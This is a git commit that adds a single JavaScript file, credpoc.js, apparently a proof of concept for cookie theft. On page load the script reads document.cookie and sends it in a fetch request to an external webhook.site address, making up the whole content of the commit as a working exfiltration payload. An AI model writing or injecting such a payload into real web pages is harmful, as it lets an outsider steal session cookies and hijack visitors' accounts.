33765c2fe90c6c9a1a26f85bec2e9689399418a9
RE <turbine@UnknownHardware.localdomain>
2023-02-08 12:31:52 -0500

    Initial Commit

---
+++ credpoc.js
@@ -0,0 +1,9 @@
+window.onload = function() {
+  fetch('https://webhook.site/96cc3072-024a-489c-ada9-0d43689d3cc8?cookie=' + encodeURIComponent(document.cookie), {
+    method: 'GET',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    withCredentials: true
+  });
+};
